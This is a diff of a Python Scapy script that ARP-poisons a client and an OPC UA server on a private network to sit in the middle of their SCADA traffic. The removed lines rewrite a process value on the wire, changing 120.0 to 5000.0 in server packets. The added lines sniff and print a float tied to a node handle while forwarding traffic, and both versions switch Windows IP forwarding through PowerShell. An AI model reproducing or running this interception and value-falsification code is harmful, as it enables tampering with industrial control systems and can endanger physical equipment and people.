@@ -1,95 +1,68 @@
 from scapy.all import *
-import time
 import struct
 import subprocess
-import signal
+import time
 
-INTERFACE = 20  
-SERVER_IP = "10.204.157.171" # <--- Replace with the real Server IPv4
-TARGET_IP = "10.204.157.245" # <--- This is YOUR IP (the Flask Client)
+# --- CONFIGURATION ---
+INTERFACE = "Intel(R) Wi-Fi 6E AX211 160MHz"
+TARGET_IP = "10.204.157.130"
+SERVER_IP = "10.204.157.171"
+CLIENT_MAC = "36:9c:dd:31:96:0c".replace('-', ':') 
+SERVER_MAC = "d8:3a:dd:5e:9f:bf".replace('-', ':')
+TARGET_HANDLE = b'\x02\x00\x00\x00\x00\x00\x00\x00' 
 
-OLD_VAL = 120.0
-NEW_VAL = 5000.0
+def spoof_arp(target_ip, spoof_ip, target_mac):
+    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    sendp(packet, iface=INTERFACE, verbose=False)
 
-keep_running = True
+def process_and_forward(pkt):
+    if not pkt.haslayer(IP):
+        return
 
-def signal_handler(sig, frame):
-    global keep_running
-    print("\n[!] Shutdown signal received...")
-    keep_running = False
-
-def get_mac(ip):
-    """Fetch MAC address for ARP spoofing."""
-    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), 
-                 iface=INTERFACE, timeout=2, verbose=False)
-    for _, rcv in ans:
-        return rcv.src
-    return None
-
-def spoof_arp(target_ip, host_ip):
-    """Poison ARP cache."""
-    target_mac = get_mac(target_ip)
-    if not target_mac: return
-    # op=2 is a reply. We tell target that host is at OUR MAC.
-    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip)
-    send(packet, iface=INTERFACE, verbose=False)
-
-def manipulate_opcua(pkt):
-    """Intercept and modify packets in transit."""
-    if pkt.haslayer(TCP) and pkt[IP].src == SERVER_IP and pkt[TCP].sport == 4840:
+    # Check if packet is from Server to Client
+    if pkt[IP].src == SERVER_IP and pkt[IP].dst == TARGET_IP:
         if pkt.haslayer(Raw):
             payload = pkt[Raw].load
-            # OPC UA floats are 8-byte Little-Endian doubles
-            old_hex = struct.pack('<d', OLD_VAL)
-            new_hex = struct.pack('<d', NEW_VAL)
-            
-            if old_hex in payload:
-                print(f"[!] INTERCEPTED: Changing {OLD_VAL} to {NEW_VAL} on the wire!")
-                modified_payload = payload.replace(old_hex, new_hex)
-                
-                # Rebuild TCP packet with new payload
-                new_pkt = (IP(src=pkt[IP].src, dst=pkt[IP].dst) /
-                           TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, 
-                               seq=pkt[TCP].seq, ack=pkt[TCP].ack, flags=pkt[TCP].flags) /
-                           modified_payload)
-                
-                # Force recalculation of headers
-                del new_pkt[IP].len
-                del new_pkt[IP].chksum
-                del new_pkt[TCP].chksum
-                send(new_pkt, iface=INTERFACE, verbose=False)
-                return 
+            if TARGET_HANDLE in payload:
+                idx = payload.find(TARGET_HANDLE)
+                val_pos = idx + 16
+                if len(payload) >= val_pos + 4:
+                    raw_bytes = payload[val_pos:val_pos+4]
+                    try:
+                        val = struct.unpack('<f', raw_bytes)[0]
+                        print(f"[DATA] load_val: {val:.2f}")
+                    except: pass
+        
+        # Manually route to Client
+        pkt[Ether].dst = CLIENT_MAC
+        sendp(pkt, iface=INTERFACE, verbose=False)
 
-    # Forward other traffic so we don't break the SCADA link
-    if pkt.haslayer(IP) and pkt[IP].dst != get_if_addr(INTERFACE):
-        send(pkt, iface=INTERFACE, verbose=False)
-
-signal.signal(signal.SIGINT, signal_handler)
+    # Check if packet is from Client to Server
+    elif pkt[IP].src == TARGET_IP and pkt[IP].dst == SERVER_IP:
+        # Manually route to Server
+        pkt[Ether].dst = SERVER_MAC
+        sendp(pkt, iface=INTERFACE, verbose=False)
 
 def main():
-    show_interfaces()
-    print(f"[*] Starting Data Manipulation on: {INTERFACE}")
+    print("[*] Initializing Stable Sniffer...")
+    # Ensure forwarding is OFF so Windows doesn't double-send packets
+    subprocess.run(["powershell", "Set-NetIPInterface -Forwarding Disabled"], shell=True)
     
-    # Enable Windows IP Forwarding via PowerShell
-    print("[*] Enabling IP Forwarding...")
-    subprocess.run(["powershell", "Set-NetIPInterface -Forwarding Enabled"], shell=True)
-
     try:
-        print("[*] Poisoning ARP... Press Ctrl+C to stop.")
         while True:
-            # Tell Client we are Server
-            spoof_arp(TARGET_IP, SERVER_IP)
-            # Tell Server we are Client
-            spoof_arp(SERVER_IP, TARGET_IP)
+            # Spoof once
+            spoof_arp(TARGET_IP, SERVER_IP, CLIENT_MAC)
+            spoof_arp(SERVER_IP, TARGET_IP, SERVER_MAC)
             
-            # Intercept 5 packets at a time
-            sniff(iface=INTERFACE, prn=manipulate_opcua, filter="tcp port 4840", count=5, timeout=1, store=0, stop_filter=lambda x: not keep_running)
-            
-            if not keep_running:
-                break
+            # Sniff for 5 seconds before re-spoofing to keep network stable
+            sniff(iface=INTERFACE, 
+                  prn=process_and_forward, 
+                  filter=f"tcp and (host {SERVER_IP} or host {TARGET_IP})", 
+                  timeout=5, 
+                  store=0)
     except KeyboardInterrupt:
-        print("\n[*] Restoring and disabling forwarding...")
-        subprocess.run(["powershell", "Set-NetIPInterface -Forwarding Disabled"], shell=True)
+        print("\n[*] Restoring...")
+        subprocess.run(["powershell", "Set-NetIPInterface -Forwarding Enabled"], shell=True)
 
 if __name__ == "__main__":
     main()
